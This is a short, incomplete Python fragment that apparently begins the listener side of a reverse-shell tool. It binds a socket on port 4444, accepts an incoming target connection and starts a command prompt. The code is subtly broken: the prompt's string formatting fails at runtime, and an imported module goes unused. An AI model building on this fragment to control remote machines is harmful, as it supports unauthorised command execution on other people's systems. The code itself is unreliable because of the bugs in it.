import socket
import subprocess


def shell():
  command=input("Command: " %str(ip))

def server():
  global s
  global ip
  global target
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind(("192.168.0.1", 4444))
  s.listen(5)
  target, ip = s.accept()
